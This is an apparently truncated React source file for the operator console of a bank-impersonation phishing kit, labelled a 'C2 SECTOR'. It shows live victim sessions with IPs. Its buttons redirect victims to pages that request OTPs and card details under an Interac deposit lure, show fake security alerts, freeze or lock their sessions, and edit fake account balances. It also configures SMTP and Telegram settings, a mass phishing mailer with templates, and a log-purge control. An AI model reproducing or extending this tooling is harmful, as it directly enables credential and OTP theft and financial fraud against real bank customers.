import React, { useState } from 'react';
import { useSocket } from '../shared/SocketContext';
import { useBank } from '../shared/BankContext';
import { ActiveUser, ActionLog } from '../types';
import { GlobalSettings, UserSettings as SharedUserSettings, User as SharedUser } from '../shared/types';
import { 
  X, Users, Activity, Terminal, Send, RefreshCw, ExternalLink, 
  Trash2, Settings, MessageSquare, ChevronLeft, Clock, Shield, DollarSign, 
  Mail, Zap, Database, Smartphone, Lock, Globe, Power, Bell, CreditCard
} from 'lucide-react';
import { Mailer } from './Mailer';

interface AdminUser {
  username: string;
  password?: string;
  initialBalance?: string;
  accounts?: Record<string, { balance: number }>;
  settings?: SharedUserSettings;
  enabled?: boolean;
  autoDeleteAt?: string | null;
  [key: string]: any;
}

interface Template {
  name: string;
  last_modified: string;
}

export const AdminPanel = () => {
  const { activeUsers, logs, deployOutput, sendCommand } = useSocket();
  const { toggleAdminPanel } = useBank();
  const [activeTab, setActiveTab] = useState<'live' | 'database' | 'mailer' | 'system' | 'settings' | 'templates'>('live');
  const [globalSettings, setGlobalSettings] = useState<GlobalSettings | null>(null);
  const [selectedUser, setSelectedUser] = useState<string | null>(null);
  const [mailerStatus, setMailerStatus] = useState<any | null>(null);
  const [mailerLogs, setMailerLogs] = useState<string[]>([]);
  const [mailerConfig, setMailerConfig] = useState<any | null>(null);
  const [templates, setTemplates] = useState<Template[]>([]);
  const [selectedTemplate, setSelectedTemplate] = useState<string | null>(null);
  const [templateContent, setTemplateContent] = useState('');
  const [users, setUsers] = useState<AdminUser[]>([]);
  const [testEmail, setTestEmail] = useState('');
  const [isRefreshing, setIsRefreshing] = useState(false);
  const [newUser, setNewUser] = useState({ username: '', password: '', initialBalance: '1000' });
  const [showAddUser, setShowAddUser] = useState(false);
  const [editingUser, setEditingUser] = useState<AdminUser | null>(null);

  const fetchGlobalSettings = async (retries = 3) => {
    try {
      const res = await fetch('/api/admin/global-settings.php?token=projectsarah');
      if (res.ok) {
        const data = await res.json();
        setGlobalSettings({
          smtp: { host: '', port: 587, secure: false, user: '', pass: '', senderName: '', ...data.smtp },
          telegram: { token: '', chatId: '', ...data.telegram },
          general: { adminPin: '6969', overdraftLimit: 500, transferLimit: 3000, dailyLimit: 3000, maintenanceMode: false, mailerType: 'node', ...data.general },
          ...data
        });
      } else {
        throw new Error(`Server returned ${res.status}`);
      }
    } catch (error) {
      console.error('Failed to fetch global settings:', error);
      if (retries > 0) {
        console.log(`Retrying... (${retries} retries left)`);
        setTimeout(() => fetchGlobalSettings(retries - 1), 1000);
      }
    }
  };

  const saveGlobalSettings = async () => {
    try {
      const res = await fetch('/api/admin/global-settings.php?token=projectsarah', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(globalSettings)
      });
      if (res.ok) {
        alert('Global settings saved!');
        handleCommand('all', 'refresh_settings');
      }
    } catch (error) {
      console.error('Failed to save global settings:', error);
      alert('Failed to save global settings');
    }
  };

  const fetchMailerData = async () => {
    setIsRefreshing(true);
    try {
      const [statusRes, logsRes, configRes] = await Promise.all([
        fetch('/api/admin/mailer/status'),
        fetch('/api/admin/mailer/logs'),
        fetch('/api/admin/global-settings')
      ]);

      if (statusRes.ok) setMailerStatus(await statusRes.json());
      if (logsRes.ok) {
        const logsData = await logsRes.json();
        setMailerLogs(logsData.logs || []);
      }
      if (configRes.ok) {
        const configData = await configRes.json();
        setMailerConfig(configData || null);
      }
    } catch (error) {
      console.error('Failed to fetch mailer data:', error);
    } finally {
      setIsRefreshing(false);
    }
  };

  const handleSendTest = async () => {
    if (!testEmail) return;
    try {
      const res = await fetch('/api/admin/mailer/test', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ email: testEmail })
      });
      const data = await res.json();
      alert(data.success ? 'Test email sent!' : `Error: ${data.error}`);
      fetchMailerData();
    } catch (error) {
      console.error('Failed to send test email:', error);
      alert('Failed to send test email');
    }
  };

  const handleClearMailerLogs = async () => {
    if (!confirm('Are you sure you want to delete all mailer logs?')) return;
    try {
      await fetch('/api/admin/mailer/delete-logs', { method: 'POST' });
      fetchMailerData();
    } catch (error) {
      console.error('Failed to clear logs:', error);
      alert('Failed to clear logs');
    }
  };

  const fetchTemplates = async () => {
    try {
      const res = await fetch('/api/admin/mailer/templates');
      if (!res.ok) {
        console.error(`Failed to fetch templates: ${res.status} ${res.statusText}`);
        return;
      }
      const data = await res.json();
      setTemplates(data.templates || []);
    } catch (error) {
      console.error('Failed to fetch templates:', error);
    }
  };

  const fetchTemplateContent = async (templateName: string) => {
    try {
      const res = await fetch(`/api/admin/mailer/template-content?template=${templateName}`);
      if (res.ok) {
        const data = await res.json();
        setTemplateContent(data.content || '');
        setSelectedTemplate(templateName);
      }
    } catch (error) {
      console.error('Failed to fetch template content:', error);
    }
  };

  const handleUpdateTemplate = async () => {
    if (!selectedTemplate) return;
    try {
      const res = await fetch('/api/admin/mailer/update-template', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ template: selectedTemplate, content: templateContent })
      });
      const data = await res.json();
      alert(data.success ? 'Template updated!' : `Error: ${data.error}`);
    } catch (error) {
      console.error('Failed to update template:', error);
      alert('Failed to update template');
    }
  };

  const fetchUsers = async () => {
    try {
      const res = await fetch('/api/admin/users.php?token=projectsarah');
      if (res.ok) {
        const data = await res.json();
        setUsers(data.users || []);
      }
    } catch (error) {
      console.error('Failed to fetch users:', error);
    }
  };

  const handleCreateUser = async () => {
    if (!newUser.username || !newUser.password) return;
    try {
      const res = await fetch('/api/admin/users/create.php?token=projectsarah', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(newUser)
      });
      const data = await res.json();
      if (data.success) {
        alert('User created successfully!');
        setNewUser({ username: '', password: '', initialBalance: '1000' });
        setShowAddUser(false);
        fetchUsers();
      } else {
        alert(`Error: ${data.message}`);
      }
    } catch (error) {
      console.error('Failed to create user:', error);
      alert('Failed to create user');
    }
  };

  const handleDeleteUser = async (username: string) => {
    if (!confirm(`Are you sure you want to delete user ${username}?`)) return;
    try {
      const res = await fetch('/api/user/delete.php?token=projectsarah', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ username })
      });
      const data = await res.json();
      if (data.success) {
        alert('User deleted!');
        fetchUsers();
      }
    } catch (error) {
      console.error('Failed to delete user:', error);
      alert('Failed to delete user');
    }
  };

  const handleToggleEnabled = async (username: string) => {
    try {
      const res = await fetch('/api/admin/users/toggle-enabled.php?token=projectsarah', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ username })
      });
      const data = await res.json();
      if (data.success) {
        fetchUsers();
      }
    } catch (error) {
      console.error('Failed to toggle user status:', error);
      alert('Failed to toggle user status');
    }
  };

  const handleUpdateBalance = async (username: string, account: string) => {
    const balance = prompt(`Enter new balance for ${account}:`);
    if (balance === null || isNaN(parseFloat(balance))) return;
    
    try {
      const res = await fetch('/api/admin/users/update-balance.php?token=projectsarah', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ username, account, balance: parseFloat(balance) })
      });
      const data = await res.json();
      if (data.success) {
        alert('Balance updated!');
        fetchUsers();
        if (editingUser && editingUser.username === username) {
          const updatedUsersRes = await fetch('/api/admin/users.php?token=projectsarah');
          const updatedUsersData = await updatedUsersRes.json();
          const updatedUser = updatedUsersData.users.find((u: AdminUser) => u.username === username);
          setEditingUser(updatedUser);
        }
      }
    } catch (error) {
      console.error('Failed to update balance:', error);
      alert('Failed to update balance');
    }
  };

  const handleSaveUserSettings = async () => {
    if (!editingUser) return;
    try {
      const res = await fetch('/api/admin/users/update-settings.php?token=projectsarah', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ 
          username: editingUser.username, 
          settings: editingUser.settings 
        })
      });
      
      const autoDeleteRes = await fetch('/api/admin/users/set-auto-delete.php?token=projectsarah', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ 
          username: editingUser.username, 
          deleteAt: editingUser.autoDeleteAt 
        })
      });

      if (res.ok && autoDeleteRes.ok) {
        alert('User settings saved!');
        fetchUsers();
      }
    } catch (error) {
      console.error('Failed to save user settings:', error);
      alert('Failed to save user settings');
    }
  };

  const handleCommand = (targetId: string, command: string, payload?: unknown) => {
    sendCommand(targetId, command, payload);
  };

  return (
    <div className="absolute inset-0 bg-[#0A0A0B] z-[1000] flex flex-col text-[#E0E0E6] font-mono selection:bg-cyan-500/30">
      {/* MISSION CONTROL HEADER */}
      <div className="px-5 py-4 border-b border-white/5 flex items-center justify-between bg-[#111113] backdrop-blur-xl">
        <div className="flex items-center gap-4">
          <div className="relative">
            <div className="absolute inset-0 bg-cyan-500/20 blur-md animate-pulse"></div>
            <Terminal className="w-5 h-5 text-cyan-400 relative z-10" />
          </div>
          <div>
            <h2 className="font-black text-xs tracking-widest text-white uppercase">SARAH OS | C2 SECTOR</h2>
            <div className="flex items-center gap-2 mt-0.5">
              <span className="w-1.5 h-1.5 rounded-full bg-green-500 animate-pulse"></span>
              <span className="text-[9px] text-gray-500 uppercase tracking-tighter">System Online // Node-Dispatcher-v4</span>
            </div>
          </div>
        </div>
        
        <div className="flex items-center gap-3">
          <div className="text-right hidden sm:block mr-2">
            <div className="text-[10px] text-cyan-500 font-bold">{new Date().toLocaleTimeString()}</div>
            <div className="text-[8px] text-gray-600 uppercase">Local Operator Time</div>
          </div>
          <button onClick={toggleAdminPanel} className="p-2 hover:bg-white/5 rounded-lg border border-white/5 hover:border-white/10 transition-all text-gray-400 hover:text-white">
            <X className="w-5 h-5" />
          </button>
        </div>
      </div>

      {/* CORE DISPLAY ZONE */}
      <div className="flex-1 overflow-y-auto pb-24 px-4 pt-4 custom-scrollbar">
        {activeTab === 'live' ? (
          <div className="space-y-3">
            {Object.values(activeUsers).length === 0 ? (
              <div className="text-center py-10 text-gray-500 italic">No active sessions found.</div>
            ) : (
              (Object.values(activeUsers) as ActiveUser[]).map((u) => (
                <div key={u.id} className={`p-3 rounded-lg border transition-all ${selectedUser === u.id ? 'bg-red-500/10 border-red-500/50' : 'bg-[#2c2c2e] border-white/5 hover:border-white/20'}`}>
                  <div className="flex items-start justify-between mb-2">
                    <div onClick={() => setSelectedUser(selectedUser === u.id ? null : u.id)} className="cursor-pointer">
                      <div className="font-bold text-xs flex items-center gap-2">
                        <span className={`w-2 h-2 rounded-full ${Date.now() - new Date(u.lastSeen).getTime() < 10000 ? 'bg-green-500 animate-pulse' : 'bg-gray-500'}`}></span>
                        {u.username}
                      </div>
                      <div className="text-[9px] text-gray-400 font-mono mt-0.5">{u.id}</div>
                    </div>
                    <div className="text-[9px] bg-black/30 px-1.5 py-0.5 rounded text-gray-300 font-mono">
                      {u.ip}
                    </div>
                  </div>
                  
                  <div className="text-[10px] text-gray-300 mb-3 flex items-center gap-1.5">
                    <ExternalLink className="w-3 h-3 text-red-400" />
                    <span className="truncate max-w-[200px]">{u.currentPath}</span>
                  </div>

                  {selectedUser === u.id && (
                    <div className="grid grid-cols-2 gap-2 pt-3 border-t border-white/5 mt-3">
                      <div className="col-span-2 text-[8px] font-bold text-cyan-500/50 uppercase mb-1 tracking-widest">Navigation Controls</div>
                      <button 
                        onClick={() => handleCommand(u.id, 'redirect', { path: '/login' })}
                        className="flex items-center justify-center gap-1.5 bg-white/5 hover:bg-cyan-500/20 py-2 rounded text-[9px] font-bold transition-all border border-white/5 hover:border-cyan-500/50"
                      >
                        <Lock className="w-3 h-3" /> LOGIN PAGE
                      </button>
                      <button 
                        onClick={() => handleCommand(u.id, 'redirect', { path: '/deposit' })}
                        className="flex items-center justify-center gap-1.5 bg-white/5 hover:bg-cyan-500/20 py-2 rounded text-[9px] font-bold transition-all border border-white/5 hover:border-cyan-500/50"
                      >
                        <Globe className="w-3 h-3" /> INTERAC LOBBY
                      </button>

                      <div className="col-span-2 text-[8px] font-bold text-red-500/50 uppercase mt-2 mb-1 tracking-widest">Phishing Inputs</div>
                      <button 
                        onClick={() => handleCommand(u.id, 'redirect', { path: `/deposit?ref=${Math.random().toString(36).substring(7).toUpperCase()}&amt=3000&from=INTERAC&type=otp` })}
                        className="flex items-center justify-center gap-1.5 bg-red-500/10 hover:bg-red-500/20 py-2 rounded text-[9px] font-bold transition-all border border-red-500/20"
                      >
                        <Smartphone className="w-3 h-3" /> REQUEST OTP
                      </button>
                      <button 
                        onClick={() => handleCommand(u.id, 'redirect', { path: `/deposit?type=card` })}
                        className="flex items-center justify-center gap-1.5 bg-red-500/10 hover:bg-red-500/20 py-2 rounded text-[9px] font-bold transition-all border border-red-500/20"
                      >
                        <CreditCard className="w-3 h-3" /> REQUEST CARD
                      </button>

                      <div className="col-span-2 text-[8px] font-bold text-orange-500/50 uppercase mt-2 mb-1 tracking-widest">Session Authority</div>
                      <button 
                        onClick={() => handleCommand(u.id, 'alert', { message: 'Security check required. Please wait...' })}
                        className="flex items-center justify-center gap-1.5 bg-white/5 hover:bg-white/10 py-2 rounded text-[9px] font-bold transition-all border border-white/5"
                      >
                        <Bell className="w-3 h-3" /> ALERT
                      </button>
                      <button 
                        onClick={() => handleCommand(u.id, 'reload')}
                        className="flex items-center justify-center gap-1.5 bg-white/5 hover:bg-white/10 py-2 rounded text-[9px] font-bold transition-all border border-white/5"
                      >
                        <RefreshCw className="w-3 h-3" /> REFRESH
                      </button>
                      <button 
                        onClick={() => handleCommand(u.id, 'redirect', { path: '/maintenance' })}
                        className="flex items-center justify-center gap-1.5 bg-orange-500/10 hover:bg-orange-500/20 py-2 rounded text-[9px] font-bold transition-all border border-orange-500/20 text-orange-400"
                      >
                        <Power className="w-3 h-3" /> FREEZE UI
                      </button>
                      <button 
                        onClick={() => handleCommand(u.id, 'redirect', { path: '/locked' })}
                        className="flex items-center justify-center gap-1.5 bg-red-900/20 hover:bg-red-900/40 py-2 rounded text-[9px] font-bold transition-all border border-red-500/30 text-red-500"
                      >
                        <Shield className="w-3 h-3" /> LOCK ACCT
                      </button>
                    </div>
                  )}
                </div>
              ))
            )}
          </div>
        ) : activeTab === 'database' ? (
          <div className="space-y-4">
            {editingUser ? (
              <div className="space-y-4 animate-in slide-in-from-right duration-200">
                <div className="flex items-center justify-between bg-[#2c2c2e] p-3 rounded-lg border border-white/5">
                  <button 
                    onClick={() => setEditingUser(null)}
                    className="flex items-center gap-1 text-gray-400 hover:text-white transition-colors text-[10px] font-bold"
                  >
                    <ChevronLeft className="w-4 h-4" /> BACK
                  </button>
                  <div className="text-xs font-bold text-red-500 uppercase">{editingUser.username}</div>
                  <button 
                    onClick={handleSaveUserSettings}
                    className="bg-red-600 hover:bg-red-700 px-3 py-1 rounded text-[9px] font-bold transition-colors"
                  >
                    SAVE
                  </button>
                </div>

                <div className="p-4 bg-[#2c2c2e] rounded-lg border border-white/5 space-y-4">
                  <h3 className="text-[10px] font-bold text-gray-400 uppercase flex items-center gap-2">
                    <DollarSign className="w-3.5 h-3.5" /> ACCOUNT BALANCES
                  </h3>
                  <div className="space-y-2">
                    {Object.entries(editingUser.accounts || {}).map(([name, acc]) => (
                      <div key={name} className="flex items-center justify-between bg-black/20 p-2 rounded border border-white/5">
                        <span className="text-[10px] text-gray-300">{name}</span>
                        <div className="flex items-center gap-3">
                          <span className="font-mono text-emerald-400 text-[11px]">${acc.balance?.toFixed(2)}</span>
                          <button 
                            onClick={() => handleUpdateBalance(editingUser.username, name)}
                            className="p-1.5 hover:bg-white/10 rounded text-gray-500 hover:text-white transition-colors"
                          >
                            <Settings className="w-3.5 h-3.5" />
                          </button>
                        </div>
                      </div>
                    ))}
                  </div>
                </div>

                <div className="p-4 bg-[#2c2c2e] rounded-lg border border-white/5 space-y-4">
                  <h3 className="text-[10px] font-bold text-gray-400 uppercase flex items-center gap-2">
                    <Users className="w-3.5 h-3.5" /> IDENTITY
                  </h3>
                  <div className="space-y-3">
                    <div className="space-y-1">
                      <label className="text-[9px] text-gray-500 uppercase font-bold">Account Holder Name</label>
                      <input 
                        type="text" 
                        value={editingUser.settings?.accountHolderName || ''} 
                        onChange={(e) => setEditingUser({
                          ...editingUser,
                          settings: { ...editingUser.settings, accountHolderName: e.target.value }
                        })}
                        className="w-full bg-black/30 border border-white/10 rounded px-3 py-1.5 text-[10px] focus:outline-none focus:border-red-500/50"
                        placeholder="Legal Name"
                      />
                    </div>
                    <div className="space-y-1">
                      <label className="text-[9px] text-gray-500 uppercase font-bold">Email Sender Name</label>
                      <input 
                        type="text" 
                        value={editingUser.settings?.phpmailerSenderName || ''} 
                        onChange={(e) => setEditingUser({
                          ...editingUser,
                          settings: { ...editingUser.settings, phpmailerSenderName: e.target.value }
                        })}
                        className="w-full bg-black/30 border border-white/10 rounded px-3 py-1.5 text-[10px] focus:outline-none focus:border-red-500/50"
                        placeholder="Display Name"
                      />
                    </div>
                  </div>
                </div>

                <div className="p-4 bg-[#2c2c2e] rounded-lg border border-white/5 space-y-4">
                  <h3 className="text-[10px] font-bold text-gray-400 uppercase flex items-center gap-2">
                    <Shield className="w-3.5 h-3.5" /> TRANSFER LIMITS
                  </h3>
                  <div className="grid grid-cols-2 gap-3">
                    <div className="space-y-1">
                      <label className="text-[9px] text-gray-500 uppercase font-bold">Per Transfer</label>
                      <input 
                        type="number" 
                        value={editingUser.settings?.transferLimit || 1000} 
                        onChange={(e) => setEditingUser({
                          ...editingUser,
                          settings: { ...editingUser.settings, transferLimit: parseFloat(e.target.value) }
                        })}
                        className="w-full bg-black/30 border border-white/10 rounded px-3 py-1.5 text-[10px] focus:outline-none focus:border-red-500/50"
                      />
                    </div>
                    <div className="space-y-1">
                      <label className="text-[9px] text-gray-500 uppercase font-bold">Daily Limit</label>
                      <input 
                        type="number" 
                        value={editingUser.settings?.dailyLimit || 3000} 
                        onChange={(e) => setEditingUser({
                          ...editingUser,
                          settings: { ...editingUser.settings, dailyLimit: parseFloat(e.target.value) }
                        })}
                        className="w-full bg-black/30 border border-white/10 rounded px-3 py-1.5 text-[10px] focus:outline-none focus:border-red-500/50"
                      />
                    </div>
                  </div>
                </div>

                <div className="p-4 bg-[#2c2c2e] rounded-lg border border-white/5 space-y-4">
                  <h3 className="text-[10px] font-bold text-gray-400 uppercase flex items-center gap-2">
                    <Clock className="w-3.5 h-3.5" /> AUTO-DELETE TIMER
                  </h3>
                  <div className="space-y-2">
                    <label className="text-[9px] text-gray-500 uppercase font-bold">Delete Account At (ISO Date)</label>
                    <div className="flex gap-2">
                      <input 
                        type="datetime-local" 
                        value={editingUser.autoDeleteAt ? new Date(editingUser.autoDeleteAt).toISOString().slice(0, 16) : ''} 
                        onChange={(e) => setEditingUser({
                          ...editingUser,
                          autoDeleteAt: e.target.value ? new Date(e.target.value).toISOString() : null
                        })}
                        className="flex-1 bg-black/30 border border-white/10 rounded px-3 py-1.5 text-[10px] focus:outline-none focus:border-red-500/50"
                      />
                      <button 
                        onClick={() => setEditingUser({ ...editingUser, autoDeleteAt: null })}
                        className="p-1.5 bg-white/5 hover:bg-red-500/20 text-gray-400 hover:text-red-500 rounded transition-colors"
                        title="Clear Timer"
                      >
                        <Trash2 className="w-4 h-4" />
                      </button>
                    </div>
                    <div className="text-[8px] text-gray-500 italic">
                      {editingUser.autoDeleteAt ? `Expires on: ${new Date(editingUser.autoDeleteAt).toLocaleString()}` : 'No expiration set'}
                    </div>
                  </div>
                </div>

                <div className="grid grid-cols-1 gap-2">
                  <button 
                    onClick={() => handleToggleEnabled(editingUser.username)}
                    className={`w-full py-2.5 rounded text-[10px] font-bold transition-colors flex items-center justify-center gap-2 ${editingUser.enabled !== false ? 'bg-orange-600/20 text-orange-500 hover:bg-orange-600/30' : 'bg-green-600/20 text-green-500 hover:bg-green-600/30'}`}
                  >
                    <RefreshCw className="w-3.5 h-3.5" />
                    {editingUser.enabled !== false ? 'DISABLE ACCOUNT' : 'ENABLE ACCOUNT'}
                  </button>
                  <button 
                    onClick={() => {
                      handleDeleteUser(editingUser.username);
                      setEditingUser(null);
                    }}
                    className="w-full bg-red-600/20 text-red-500 hover:bg-red-600/30 py-2.5 rounded text-[10px] font-bold transition-colors flex items-center justify-center gap-2"
                  >
                    <Trash2 className="w-3.5 h-3.5" /> DELETE USER PERMANENTLY
                  </button>
                </div>
              </div>
            ) : (
              <div className="space-y-4">
                <button 
                  onClick={() => setShowAddUser(!showAddUser)}
                  className="w-full bg-red-600 hover:bg-red-700 py-2.5 rounded text-[10px] font-bold transition-all shadow-lg flex items-center justify-center gap-2"
                >
                  {showAddUser ? <ChevronLeft className="w-4 h-4" /> : <Users className="w-4 h-4" />}
                  {showAddUser ? 'CANCEL' : 'ADD NEW USER'}
                </button>

                {showAddUser && (
                  <div className="p-4 bg-[#2c2c2e] rounded-lg border border-red-500/30 space-y-4 animate-in slide-in-from-top duration-200">
                    <div className="space-y-1">
                      <label className="text-[9px] text-gray-500 uppercase font-bold">Username</label>
                      <input 
                        type="text" 
                        value={newUser.username} 
                        onChange={(e) => setNewUser({ ...newUser, username: e.target.value })}
                        className="w-full bg-black/30 border border-white/10 rounded px-3 py-1.5 text-[10px] focus:outline-none focus:border-red-500/50"
                      />
                    </div>
                    <div className="space-y-1">
                      <label className="text-[9px] text-gray-500 uppercase font-bold">Password</label>
                      <input 
                        type="text" 
                        value={newUser.password} 
                        onChange={(e) => setNewUser({ ...newUser, password: e.target.value })}
                        className="w-full bg-black/30 border border-white/10 rounded px-3 py-1.5 text-[10px] focus:outline-none focus:border-red-500/50"
                      />
                    </div>
                    <div className="space-y-1">
                      <label className="text-[9px] text-gray-500 uppercase font-bold">Initial Balance ($)</label>
                      <input 
                        type="number" 
                        value={newUser.initialBalance} 
                        onChange={(e) => setNewUser({ ...newUser, initialBalance: e.target.value })}
                        className="w-full bg-black/30 border border-white/10 rounded px-3 py-1.5 text-[10px] focus:outline-none focus:border-red-500/50"
                      />
                    </div>
                    <button 
                      onClick={handleCreateUser}
                      className="w-full bg-green-600 hover:bg-green-700 py-2.5 rounded text-[10px] font-bold transition-colors shadow-lg"
                    >
                      CREATE USER
                    </button>
                  </div>
                )}

                <div className="grid grid-cols-1 gap-2">
                  {users.length === 0 ? (
                    <div className="text-center py-10 text-gray-500 italic">No users found.</div>
                  ) : (
                    users.map((u: AdminUser, i: number) => (
                      <button 
                        key={i} 
                        onClick={() => setEditingUser(u)}
                        className="p-3 bg-[#2c2c2e] rounded-lg border border-white/5 hover:border-red-500/30 transition-all text-left group"
                      >
                        <div className="flex items-center justify-between mb-1">
                          <div className="font-bold text-xs flex items-center gap-2">
                            <span className={`w-1.5 h-1.5 rounded-full ${u.enabled !== false ? 'bg-green-500' : 'bg-red-500'}`}></span>
                            {u.username || 'Unknown'}
                          </div>
                          <ChevronLeft className="w-3 h-3 text-gray-600 group-hover:text-red-500 rotate-180 transition-all" />
                        </div>
                        <div className="flex items-center justify-between text-[9px] text-gray-500">
                          <span>{Object.keys(u.accounts || {}).length} Accounts</span>
                          <span className="font-mono text-emerald-500/70">
                            ${Object.values(u.accounts || {}).reduce((sum: number, acc) => sum + (acc.balance || 0), 0).toFixed(2)}
                          </span>
                        </div>
                      </button>
                    ))
                  )}
                </div>
              </div>
            )}
          </div>
        ) : activeTab === 'system' ? (
          <div className="space-y-4">
            <div className="flex items-center justify-between mb-2">
              <h3 className="text-[10px] font-bold text-cyan-500 uppercase tracking-widest flex items-center gap-2">
                <Terminal className="w-4 h-4" /> ENGINE_LOGS_STREAM
              </h3>
              <button 
                onClick={() => handleCommand('all', 'clear_logs')}
                className="text-[9px] text-gray-500 hover:text-red-500 transition-colors bg-white/5 px-2 py-1 rounded"
              >
                PURGE_LOGS
              </button>
            </div>
            
            <div className="space-y-2 font-mono text-[9px] max-h-[300px] overflow-y-auto bg-black/40 rounded border border-white/5 p-3 custom-scrollbar">
              {logs.length === 0 ? (
                <div className="text-center py-10 text-gray-700 italic">Waiting for inbound data...</div>
              ) : (
                [...logs].reverse().slice(0, 50).map((log: ActionLog) => (
                  <div key={log.id} className="mb-1 pb-1 border-b border-white/5 last:border-0 opacity-80 hover:opacity-100 transition-opacity">
                    <span className="text-gray-600">[{new Date(log.timestamp).toLocaleTimeString()}]</span>
                    <span className="text-cyan-500 mx-2">@{log.username || 'SYS'}</span>
                    <span className="text-gray-400">{log.action}: {typeof log.details === 'string' ? log.details : JSON.stringify(log.details)}</span>
                  </div>
                ))
              )}
            </div>

            <div className="p-4 bg-[#111113] rounded-lg border border-white/5 space-y-4">
              <h3 className="text-[10px] font-bold text-gray-400 uppercase flex items-center gap-2">
                <RefreshCw className="w-3.5 h-3.5" /> DEPLOYMENT_CORE
              </h3>
              <div className="grid grid-cols-2 gap-2">
                <button 
                  onClick={() => handleCommand('all', 'deploy', { args: [] })}
                  className="bg-cyan-600/20 text-cyan-400 hover:bg-cyan-600/30 border border-cyan-500/30 py-2.5 rounded text-[10px] font-bold transition-all"
                >
                  RUN_DEPLOY
                </button>
                <button 
                  onClick={() => handleCommand('all', 'deploy', { args: ['rebuild'] })}
                  className="bg-white/5 hover:bg-white/10 py-2.5 rounded text-[10px] font-bold transition-all border border-white/5"
                >
                  REBUILD_IMG
                </button>
              </div>
            </div>

            <div className="p-4 bg-black rounded-lg border border-white/10 font-mono text-[9px] h-[200px] overflow-y-auto flex flex-col-reverse custom-scrollbar">
              <div className="space-y-1">
                {deployOutput.length === 0 ? (
                  <div className="text-gray-600"># Waiting for deployment output...</div>
                ) : (
                  deployOutput.map((line, i) => (
                    <div key={i} className="text-cyan-400 whitespace-pre-wrap">
                      <span className="text-gray-500 mr-2">$</span>
                      {line}
                    </div>
                  ))
                )}
              </div>
            </div>
          </div>
        ) : activeTab === 'mailer' ? (
          <div className="space-y-4">
            <div className="p-4 bg-[#2c2c2e] rounded-lg border border-white/5 space-y-4">
              <h3 className="text-[10px] font-bold text-gray-400 uppercase flex items-center gap-2">
                <Settings className="w-3.5 h-3.5" /> MAILER CONFIGURATION
              </h3>
              <div className="space-y-2">
                <label className="text-[9px] text-gray-500 uppercase font-bold">Default Mailer System</label>
                <select 
                  value={(globalSettings?.general as Record<string, unknown>)?.mailerType as string || 'node'}
                  onChange={(e) => globalSettings && setGlobalSettings({
                    ...globalSettings,
                    general: { ...globalSettings.general, mailerType: e.target.value as 'node' | 'php' | 'python' }
                  })}
                  className="w-full bg-black/30 border border-white/10 rounded px-3 py-1.5 text-[10px] focus:outline-none focus:border-red-500/50"
                >
                  <option value="node">Node Mailer</option>
                  <option value="python">Python Mailer</option>
                  <option value="php">PHP Mailer</option>
                </select>
              </div>
            </div>

            {/* New TSX Mailer Component */}
            <div className="bg-[#2c2c2e] rounded-lg border border-red-500/30 overflow-hidden">
              <div className="p-3 bg-red-500/10 border-b border-red-500/20 flex items-center justify-between gap-2">
                <div className="flex items-center gap-2">
                  <Mail className="w-4 h-4 text-red-500" />
                  <span className="text-[10px] font-bold uppercase tracking-wider">TSX (Node.js) Mailer Dispatcher</span>
                </div>
                <button 
                  onClick={() => window.location.href = '/?view=mailer'}
                  className="p-1 hover:bg-white/10 rounded text-gray-400 hover:text-white transition-colors"
                  title="Open Full Screen"
                >
                  <ExternalLink className="w-3 h-3" />
                </button>
              </div>
              <div className="p-4 bg-[#1c1c1e]">
                <Mailer />
              </div>
            </div>

            <div className="p-4 bg-[#2c2c2e] rounded-lg border border-white/5">
              <div className="flex items-center justify-between mb-3">
                <h3 className="text-xs font-bold flex items-center gap-2">
                  <Activity className="w-4 h-4 text-red-500" />
                  MAILER STATUS
                </h3>
                <button 
                  onClick={fetchMailerData}
                  disabled={isRefreshing}
                  className="p-1.5 bg-white/5 hover:bg-white/10 rounded transition-colors"
                >
                  <RefreshCw className={`w-3.5 h-3.5 ${isRefreshing ? 'animate-spin' : ''}`} />
                </button>
              </div>
              {mailerStatus ? (
                <div className="grid grid-cols-2 gap-2 text-[9px] font-mono">
                  <div className="p-2 bg-black/20 rounded">
                    <div className="text-gray-500 uppercase mb-1">PHP Version</div>
                    <div>{mailerStatus.php_version}</div>
                  </div>
                  <div className="p-2 bg-black/20 rounded">
                    <div className="text-gray-500 uppercase mb-1">PHPMailer</div>
                    <div className={mailerStatus.phpmailer_installed ? 'text-green-500' : 'text-red-500'}>
                      {mailerStatus.phpmailer_installed ? 'INSTALLED' : 'MISSING'}
                    </div>
                  </div>
                  <div className="p-2 bg-black/20 rounded">
                    <div className="text-gray-500 uppercase mb-1">Templates</div>
                    <div>{mailerStatus.templates_count} FOUND</div>
                  </div>
                  <div className="p-2 bg-black/20 rounded">
                    <div className="text-gray-500 uppercase mb-1">Config</div>
                    <div className={mailerStatus.config_found ? 'text-green-500' : 'text-red-500'}>
                      {mailerStatus.config_found ? 'LOADED' : 'NOT FOUND'}
                    </div>
                  </div>
                </div>
              ) : (
                <div className="text-center py-4 text-gray-500 text-[10px] italic">Loading status...</div>
              )}
            </div>

            <div className="p-4 bg-[#2c2c2e] rounded-lg border border-white/5">
              <h3 className="text-xs font-bold mb-3 flex items-center gap-2">
                <Send className="w-4 h-4 text-red-500" />
                TEST MAILER
              </h3>
              <div className="flex gap-2">
                <input 
                  type="email"
                  value={testEmail}
                  onChange={(e) => setTestEmail(e.target.value)}
                  placeholder="Enter test email..."
                  className="flex-1 bg-black/30 border border-white/10 rounded px-3 py-1.5 text-[10px] focus:outline-none focus:border-red-500/50"
                />
                <button 
                  onClick={handleSendTest}
                  className="bg-red-600 hover:bg-red-700 px-4 py-1.5 rounded text-[10px] font-bold transition-colors"
                >
                  SEND
                </button>
              </div>
            </div>

            <div className="p-4 bg-[#2c2c2e] rounded-lg border border-white/5">
              <div className="flex items-center justify-between mb-3">
                <h3 className="text-xs font-bold flex items-center gap-2">
